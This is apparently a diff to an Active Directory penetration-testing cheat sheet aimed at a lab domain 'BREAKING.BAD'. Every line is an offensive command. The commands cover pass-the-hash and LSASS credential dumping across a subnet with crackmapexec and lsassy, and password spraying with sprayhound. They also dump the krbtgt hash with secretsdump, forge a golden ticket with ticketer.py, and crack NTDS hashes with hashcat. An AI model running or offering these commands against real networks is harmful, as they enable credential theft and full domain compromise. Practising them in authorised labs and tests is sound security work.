@@ -44,8 +44,8 @@ crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f58
 crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
 sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous -p 'azerty'
 sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous
-lsassy -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 192.168.56.0/24
-lsassy -d BREAKING.BAD -u Administrator -p 'passw0rd' 192.168.56.0/24
+lsassy -v -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 192.168.56.0/24
+lsassy -v -d BREAKING.BAD -u Administrator -p 'passw0rd' 192.168.56.0/24
 export KRB5CCNAME=Administrator.ccache
 lsassy -d BREAKING.BAD -u Administrator -k SV01.BREAKING.BAD
 nmap -Pn -sC -sV -T3 192.168.56.201
@@ -140,3 +140,4 @@ secretsdump -just-dc-user krbtgt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 'BREA
 lookupsid.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 'BREAKING.BAD/Administrator@dc01.breaking.bad' 0
 ticketer.py -nthash 123456789krbtgtnthash123456789 -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain BREAKING.BAD randomuser
 export KRB5CCNAME=randomuser.ccache
+hashcat -m 1000 --potfile-path ntds.cracked ntds.tocrack --show --username --outfile-format 3
